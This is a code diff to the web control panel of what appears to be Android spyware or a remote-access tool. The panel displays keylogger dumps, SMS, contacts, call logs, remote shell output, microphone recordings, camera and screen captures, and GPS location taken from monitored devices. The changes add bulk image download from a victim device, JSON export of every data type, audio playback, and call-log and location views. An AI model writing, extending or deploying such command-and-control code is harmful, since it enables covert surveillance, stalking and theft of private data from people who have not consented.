@@ -24,6 +24,8 @@ h2{font-size:14px;color:#5a6e82;margin-bottom:8px}
 .btn.amber:hover{background:#e0912e}
 .btn.red{background:#3a1a1a;border-color:#f85149}
 .btn.red:hover{background:#f85149}
+.btn.blue{background:#1a2a3a;border-color:#4da6ff}
+.btn.blue:hover{background:#4da6ff}
 #output{flex:1;background:#0d1117;border:1px solid #1e2a3a;border-radius:4px;padding:10px;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-word;min-height:120px}
 #toolbar{display:flex;flex-wrap:wrap;gap:4px}
 #keylog{flex:1;background:#0d1117;border:1px solid #1e2a3a;border-radius:4px;padding:10px;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-word;min-height:120px;max-height:40vh}
@@ -36,8 +38,13 @@ h2{font-size:14px;color:#5a6e82;margin-bottom:8px}
 .file-row button{background:#1a3a1a;border:1px solid #2ea043;color:#fff;padding:2px 8px;border-radius:3px;cursor:pointer;font-size:11px;font-family:monospace}
 .file-row button:hover{background:#2ea043}
 img.preview{max-width:100%;max-height:400px;border:1px solid #1e2a3a;border-radius:4px;margin:6px 0}
-a.dl{color:#4da6ff;text-decoration:underline}
+a.dl{color:#4da6ff;text-decoration:underline;cursor:pointer}
 .panel-label{font-size:11px;color:#5a6e82;margin:6px 0 2px}
+.result-bar{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+audio{width:100%;margin:6px 0}
+.export-bar{display:flex;gap:4px;flex-wrap:wrap;margin:4px 0}
+.checkbox{display:flex;align-items:center;gap:4px;padding:2px 6px;font-size:11px;cursor:pointer}
+.checkbox input{cursor:pointer}
 </style>
 </head>
 <body>
@@ -75,6 +82,9 @@ a.dl{color:#4da6ff;text-decoration:underline}
 var activeId = '';
 var deviceData = {};
 var lastListType = 'images';
+var lastResult = null;       // raw parsed payload for export
+var lastResultType = null;   // type string for export naming
+var imageCache = [];         // accumulated image entries for bulk download
 
 function esc(s){
   if(s===null||s===undefined) return '';
@@ -104,7 +114,7 @@ function renderSidebar(){
   for(var k in deviceData){
     var d = deviceData[k];
     html += '<div class="device'+(k===activeId?' sel':'')+'" onclick="select(\''+k+'\')">';
-    html += '<span class="dot '+(d.online?'on':'off')+'\"></span>';
+    html += '<span class="dot '+(d.online?'on':'off')+'"></span>';
     html += '<span class="id">'+esc(k.substring(0,16))+'...</span>';
     html += '<div class="info">'+esc(d.info.model||'?')+' | SDK '+esc(d.info.os_version||'?')+' | '+(d.online?'Online':'Offline')+'</div>';
     html += '</div>';
@@ -150,11 +160,124 @@ function humanSize(b){
   return b+' B';
 }
 
+function timestampStr(){
+  var d = new Date();
+  return d.getFullYear()+pad(d.getMonth()+1)+pad(d.getDate())+'_'+pad(d.getHours())+pad(d.getMinutes())+pad(d.getSeconds());
+}
+function pad(n){ return n<10?'0'+n:''+n; }
+
+// ── Export helpers ──────────────────────────────────────────────────────
+
+function downloadBlob(blob, filename){
+  var url = URL.createObjectURL(blob);
+  var a = document.createElement('a');
+  a.href = url; a.download = filename;
+  document.body.appendChild(a); a.click();
+  document.body.removeChild(a);
+  setTimeout(function(){ URL.revokeObjectURL(url); }, 5000);
+}
+
+function downloadDataUri(dataUri, filename){
+  var a = document.createElement('a');
+  a.href = dataUri; a.download = filename;
+  document.body.appendChild(a); a.click();
+  document.body.removeChild(a);
+}
+
+function downloadJSON(data, filename){
+  downloadBlob(new Blob([JSON.stringify(data,null,2)],{type:'application/json'}), filename);
+}
+
+function exportResult(){
+  if(!lastResult){
+    return alert('No data to export. Run a command first.');
+  }
+  var fn = (lastResultType||'result')+'_'+timestampStr()+'.json';
+  downloadJSON(lastResult, fn);
+}
+
+// ── Bulk image download ─────────────────────────────────────────────────
+
+async function downloadAllImages(){
+  if(imageCache.length === 0){
+    return alert('No images loaded. Click "Images" first.');
+  }
+  var out = document.getElementById('output');
+  out.textContent = 'Downloading '+imageCache.length+' images...\n';
+
+  var downloaded = 0;
+  var failed = 0;
+
+  for(var i=0; i<imageCache.length; i++){
+    var entry = imageCache[i];
+    out.textContent = 'Downloading '+(i+1)+'/'+imageCache.length+': '+entry.name+'\n';
+    try{
+      // Request the file content
+      var r = await fetch('/api/command',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({device_id:activeId, module:'files', action:'read',
+          params:{id:entry.id, type:lastListType, name:entry.name}})
+      });
+      var cmdResp = await r.json();
+      var cmdId = cmdResp.command_id;
+
+      // Wait for the result via polling SSE
+      var result = await waitForResult(cmdId, 30000);
+      if(result && result.payload && result.payload.base64_data){
+        var mime = result.payload.mime_type || 'image/jpeg';
+        var ext = mime.split('/')[1] || 'jpg';
+        var dataUri = 'data:'+mime+';base64,'+result.payload.base64_data;
+        downloadDataUri(dataUri, entry.name || ('image_'+entry.id+'.'+ext));
+        downloaded++;
+      } else {
+        failed++;
+      }
+    }catch(e){
+      failed++;
+    }
+    // Small delay between downloads to not overwhelm
+    await new Promise(function(r){ setTimeout(r, 500); });
+  }
+
+  out.textContent += '\nDone: '+downloaded+' downloaded, '+failed+' failed';
+}
+
+// Wait for a specific command result via SSE
+var sseResultWaiters = {};
+function waitForResult(cmdId, timeoutMs){
+  return new Promise(function(resolve){
+    var timer = setTimeout(function(){
+      delete sseResultWaiters[cmdId];
+      resolve(null);
+    }, timeoutMs);
+    sseResultWaiters[cmdId] = function(env){
+      clearTimeout(timer);
+      delete sseResultWaiters[cmdId];
+      resolve(env);
+    };
+  });
+}
+
 // ── Renderers ───────────────────────────────────────────────────────────
+
+function renderExportBar(){
+  return '<div class="export-bar">' +
+    '<button class="btn blue" onclick="exportResult()">Export JSON</button>' +
+    '</div>';
+}
 
 function renderFiles(entries, listType){
   var out = document.getElementById('output');
-  var html = '<b>Files ('+entries.length+')</b>\n';
+  imageCache = entries.slice(); // copy for bulk download
+
+  var html = '<div class="result-bar"><b>Files ('+entries.length+')</b>';
+  if(listType === 'images' && entries.length > 0){
+    html += '<button class="btn blue" onclick="downloadAllImages()">Download All ('+entries.length+')</button>';
+  }
+  html += '<button class="btn blue" onclick="exportResult()">Export List JSON</button>';
+  html += '</div>\n';
+
   entries.forEach(function(f){
     var id = esc(f.id);
     var nm = esc(f.name||'');
@@ -165,6 +288,9 @@ function renderFiles(entries, listType){
     html += '</div>';
   });
   out.innerHTML = html;
+
+  lastResult = {type:'file_list', entries:entries, list_type:listType};
+  lastResultType = 'files_'+listType;
 }
 
 function readFile(id, type, name){
@@ -176,16 +302,22 @@ function renderFileContent(p){
   var mime = p.mime_type||'application/octet-stream';
   var name = p.file_name||('file_'+p.file_id);
   var dataUri = 'data:'+mime+';base64,'+p.base64_data;
-  var html = '<b>'+esc(name)+'</b> <span class="sz">('+humanSize(p.size_bytes)+', '+esc(mime)+')</span><br>';
+
+  var html = '<div class="result-bar"><b>'+esc(name)+'</b> <span class="sz">('+humanSize(p.size_bytes)+', '+esc(mime)+')</span></div>';
+  html += '<div class="export-bar">';
+  html += '<a class="dl" href="'+dataUri+'" download="'+esc(name)+'">Download</a>';
+  html += '<button class="btn blue" onclick="exportResult()">Export JSON</button>';
+  html += '</div>';
+
   if(mime.indexOf('image/')===0){
     html += '<img class="preview" src="'+dataUri+'" alt="'+esc(name)+'">';
-    html += '<br><a class="dl" href="'+dataUri+'" download="'+esc(name)+'">Download image</a>';
-  }else if(mime.indexOf('video/')===0 || mime.indexOf('audio/')===0){
-    html += '<a class="dl" href="'+dataUri+'" download="'+esc(name)+'">Download '+esc(name)+' ('+humanSize(p.size_bytes)+')</a>';
-  }else{
-    html += '<a class="dl" href="'+dataUri+'" download="'+esc(name)+'">Download '+esc(name)+' ('+humanSize(p.size_bytes)+')</a>';
+  } else if(mime.indexOf('audio/')===0 || mime.indexOf('video/')===0 || name.match(/\.(m4a|mp3|mp4|aac|wav)$/i)){
+    html += '<audio controls src="'+dataUri+'"></audio>';
   }
   out.innerHTML = html;
+
+  lastResult = p;
+  lastResultType = 'file_'+name;
 }
 
 function appendKeylog(p){
@@ -214,9 +346,15 @@ function sse(){
 
       var p = env.payload || null;
 
+      // Check if a waiter is registered for this command
+      if(env.cmd_id && sseResultWaiters[env.cmd_id]){
+        sseResultWaiters[env.cmd_id](env);
+      }
+
       // Error envelope
       if(env.status === 'error' || (p && p.type === 'error')){
         out.textContent = 'Error: ' + ((p && p.error) || env.error || 'unknown');
+        lastResult = env; lastResultType = 'error';
         return;
       }
       if(!p){ out.textContent = JSON.stringify(env,null,2); return; }
@@ -235,6 +373,8 @@ function sse(){
           (p.keystrokes||[]).forEach(function(k){
             kd.textContent += '['+new Date(k.timestamp).toLocaleString()+'] '+k.package_name+': '+k.text+'\n';
           });
+          lastResult = p; lastResultType = 'keylog_dump';
+          out.innerHTML = '<div class="result-bar"><b>Keylog dump: '+p.count+' entries</b> <button class="btn blue" onclick="exportResult()">Export JSON</button></div>';
           break;
         case 'live_status':
           out.textContent = 'Status: '+p.status+' '+JSON.stringify(p.monitors||{});
@@ -247,30 +387,80 @@ function sse(){
           }
           break;
         case 'sms_list':
-          out.textContent = 'SMS ('+p.count+'):\n'+JSON.stringify(p.messages,null,2);
+          lastResult = p; lastResultType = 'sms';
+          var smsHtml = '<div class="result-bar"><b>SMS ('+p.count+')</b>';
+          smsHtml += '<button class="btn blue" onclick="exportResult()">Export JSON</button>';
+          smsHtml += '</div>\n';
+          smsHtml += '<pre>'+esc(JSON.stringify(p.messages,null,2))+'</pre>';
+          out.innerHTML = smsHtml;
           break;
         case 'contacts_list':
-          out.textContent = 'Contacts ('+p.count+'):\n'+JSON.stringify(p.contacts,null,2);
+          lastResult = p; lastResultType = 'contacts';
+          var contactsHtml = '<div class="result-bar"><b>Contacts ('+p.count+')</b>';
+          contactsHtml += '<button class="btn blue" onclick="exportResult()">Export JSON</button>';
+          contactsHtml += '</div>\n';
+          contactsHtml += '<pre>'+esc(JSON.stringify(p.contacts,null,2))+'</pre>';
+          out.innerHTML = contactsHtml;
+          break;
+        case 'calls_list':
+          lastResult = p; lastResultType = 'calls';
+          var callsHtml = '<div class="result-bar"><b>Calls ('+p.count+')</b>';
+          callsHtml += '<button class="btn blue" onclick="exportResult()">Export JSON</button>';
+          callsHtml += '</div>\n';
+          callsHtml += '<pre>'+esc(JSON.stringify(p.calls,null,2))+'</pre>';
+          out.innerHTML = callsHtml;
           break;
         case 'shell':
-          out.textContent = 'Shell:\n'+(p.stdout||'')+(p.stderr?'\nSTDERR:\n'+p.stderr:'');
+          lastResult = p; lastResultType = 'shell';
+          out.innerHTML = '<div class="result-bar"><b>Shell</b> <button class="btn blue" onclick="exportResult()">Export JSON</button></div><pre>'+esc(p.stdout||'')+(p.stderr?'\nSTDERR:\n'+esc(p.stderr):'')+'</pre>';
           break;
         case 'device_info':
-          out.textContent = 'Device:\n'+JSON.stringify(p,null,2);
+          lastResult = p; lastResultType = 'device_info';
+          out.innerHTML = '<div class="result-bar"><b>Device Info</b> <button class="btn blue" onclick="exportResult()">Export JSON</button></div><pre>'+esc(JSON.stringify(p,null,2))+'</pre>';
           break;
         case 'mic_recording':
-          out.textContent = 'Mic recording: '+p.duration_seconds+'s, '+p.size_bytes+' bytes';
+          lastResult = p; lastResultType = 'mic';
+          var mime = p.format === 'M4A' ? 'audio/mp4' : (p.format === 'MP3' ? 'audio/mpeg' : 'audio/aac');
+          var audioUri = 'data:'+mime+';base64,'+p.audio_base64;
+          var micHtml = '<div class="result-bar"><b>Mic Recording</b> '+p.duration_seconds+'s, '+humanSize(p.size_bytes)+', '+esc(p.format||'AAC')+'</div>';
+          micHtml += '<div class="export-bar">';
+          micHtml += '<a class="dl" href="'+audioUri+'" download="mic_'+timestampStr()+'.'+(p.format||'aac').toLowerCase()+'">Download audio</a>';
+          micHtml += '<button class="btn blue" onclick="exportResult()">Export JSON</button>';
+          micHtml += '</div>';
+          micHtml += '<audio controls src="'+audioUri+'"></audio>';
+          out.innerHTML = micHtml;
           break;
         case 'screenshot':
         case 'camera':
+          lastResult = p; lastResultType = p.type;
           if(p.image_base64){
-            out.innerHTML = '<img class="preview" src="data:image/'+(p.format||'png').toLowerCase()+';base64,'+p.image_base64+'" alt="capture">';
+            var imgMime = 'image/'+(p.format||'png').toLowerCase();
+            var imgUri = 'data:'+imgMime+';base64,'+p.image_base64;
+            var imgHtml = '<div class="result-bar"><b>'+(p.type==='screenshot'?'Screenshot':'Camera')+'</b></div>';
+            imgHtml += '<div class="export-bar">';
+            imgHtml += '<a class="dl" href="'+imgUri+'" download="'+p.type+'_'+timestampStr()+'.'+(p.format||'png').toLowerCase()+'">Download image</a>';
+            imgHtml += '<button class="btn blue" onclick="exportResult()">Export JSON</button>';
+            imgHtml += '</div>';
+            imgHtml += '<img class="preview" src="'+imgUri+'" alt="capture">';
+            out.innerHTML = imgHtml;
           }else{
             out.textContent = JSON.stringify(p,null,2);
           }
           break;
+        case 'location':
+          lastResult = p; lastResultType = 'location';
+          var locHtml = '<div class="result-bar"><b>Location</b> <button class="btn blue" onclick="exportResult()">Export JSON</button></div>';
+          if(p.latitude && p.longitude){
+            locHtml += '<pre>Lat: '+p.latitude+'\nLon: '+p.longitude+'\nAccuracy: '+(p.accuracy||'?')+'m\nTime: '+(p.timestamp||'?')+'</pre>';
+            locHtml += '<a class="dl" href="https://maps.google.com/?q='+p.latitude+','+p.longitude+'" target="_blank">Open in Google Maps</a>';
+          }else{
+            locHtml += '<pre>'+esc(JSON.stringify(p,null,2))+'</pre>';
+          }
+          out.innerHTML = locHtml;
+          break;
         default:
-          out.textContent = JSON.stringify(p,null,2);
+          lastResult = p; lastResultType = p.type||'unknown';
+          out.innerHTML = '<div class="result-bar"><b>'+esc(p.type||'Result')+'</b> <button class="btn blue" onclick="exportResult()">Export JSON</button></div><pre>'+esc(JSON.stringify(p,null,2))+'</pre>';
       }
     }catch(ex){}
   };
